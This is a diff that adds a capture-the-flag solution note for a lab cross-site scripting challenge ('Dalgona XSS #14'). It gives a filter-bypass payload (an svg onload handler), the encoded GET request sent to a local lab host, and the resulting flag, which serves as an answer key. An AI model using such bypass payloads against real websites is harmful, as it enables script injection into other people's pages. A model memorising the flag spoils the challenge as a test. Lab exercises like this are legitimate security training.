@@ -1,0 +1,4 @@
+# Dalgona XSS #14 filter bypass. Server strips '/' so use space: <svg onload=alert('XSS')>. Returns flag{ad00f199-e499-4836-b75a-7e2b7842aa59}
+
+GET /page?name=%3Csvg+onload%3Dalert%28%27XSS%27%29%3E HTTP/1.1
+Host: 172.17.0.1:58445
